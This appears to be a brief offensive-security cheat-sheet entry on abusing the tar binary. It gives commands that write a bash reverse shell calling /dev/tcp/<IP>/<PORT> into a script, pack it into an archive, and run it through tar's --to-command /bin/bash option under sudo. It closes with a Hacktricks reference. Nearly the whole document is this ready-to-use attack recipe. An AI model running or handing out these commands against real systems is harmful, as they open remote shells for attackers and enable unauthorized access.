# Tap Archive

## 01 - Common Files

```
/usr/bin/tar
```

## 02 - Execute Payloads

```
$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1' > payload.sh
tar -cvf payload.tar payload.sh
sudo -u $USER tar -xvf payload.tar --to-command /bin/bash
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/shells/shells/linux.html)